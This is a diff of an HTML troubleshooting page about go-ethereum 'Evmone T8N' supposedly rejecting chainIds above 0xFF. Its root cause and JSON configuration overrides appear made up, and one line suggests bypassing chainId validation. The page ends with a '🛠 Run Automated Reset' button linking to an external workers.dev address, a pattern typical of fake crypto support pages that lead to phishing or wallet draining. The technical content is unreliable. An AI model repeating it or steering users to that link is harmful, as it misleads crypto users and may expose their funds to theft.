@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: system-ui;
-        background: #121214;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff9455; }
     .btn {
-        background: #ff7b2c;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,38 +42,39 @@
 <h1>Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error when attempting to process transactions with a <code>chainId</code> greater than <code>0xFF</code> using the go-ethereum evmone-t8n implementation, resulting in rejected transactions.</li>
+<li>Users observe that their transactions are being rejected by the Go Ethereum Evmone T8N when the <code>chainId</code> exceeds <code>0xFF</code>, which is the maximum value that can be represented by an unsigned 8-bit integer (<code>uint8</code>).</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The issue arises due to the <code>chainId</code> being parsed as a <code>uint8</code>, which has a maximum value of <code>0xFF</code> (255), causing any <code>chainId</code> greater than this to be rejected.</li>
+<li>The error occurs due to the <code>chainId</code> being parsed as a <code>uint8</code>, which has a maximum value of <code>0xFF</code> (255). When the <code>chainId</code> is greater than <code>0xFF</code>, it overflows and causes the transaction to be rejected.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve this issue, the following steps can be taken:</li>
-<li>Update the <code>chainId</code> to a value within the <code>uint8</code> range.</li>
-<li>Modify the evmone-t8n configuration to support <code>uint16</code> or larger for <code>chainId</code>.</li>
-<li>Utilize a custom patch for the go-ethereum implementation to handle larger <code>chainId</code> values, such as:</li>
+<li>To resolve this issue, the following manual overrides can be attempted:</li>
+<li>Update the <code>chainId</code> to a value within the <code>uint8</code> range</li>
+<li>Modify the Evmone T8N configuration to parse <code>chainId</code> as a <code>uint16</code> or <code>uint32</code></li>
+<li>Use a custom transaction handler to bypass the <code>chainId</code> validation</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;chainId&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="err">x</span><span class="mi">100</span><span class="p">,</span>
 <span class="w">  </span><span class="nt">&quot;config&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
 <span class="w">    </span><span class="nt">&quot;evmone&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
 <span class="w">      </span><span class="nt">&quot;t8n&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nt">&quot;chainIdSize&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;uint16&quot;</span>
+<span class="w">        </span><span class="nt">&quot;chainIdParseType&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;uint16&quot;</span>
 <span class="w">      </span><span class="p">}</span>
 <span class="w">    </span><span class="p">}</span>
 <span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider accessing the node via an external console for further debugging.</p>
+<p>Consider utilizing an external console for further debugging. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A go-ethereum node with evmone-t8n implementation</li>
-<li>A <code>chainId</code> value greater than <code>0xFF</code></li>
-<li>Basic understanding of Ethereum transaction processing and node configuration</li>
+<li>Go Ethereum Evmone T8N installed and configured</li>
+<li>Basic understanding of Ethereum transaction handling</li>
+<li>Familiarity with JSON configuration files</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">TronLink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-importing-a-custom-token-does-not-work.html">Metamask Extension Bug Importing A Custom Token Does Not Work</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</a></li><li><a href="./archive/2026/06/metamask-extension-bug-importing-a-custom-token-does-not-work.html">Metamask Extension Bug Importing A Custom Token Does Not Work</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-manage-tokens-miss-match-with-net.html">Metamask Extension Bug Assets Manage Tokens Miss Match With Net</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
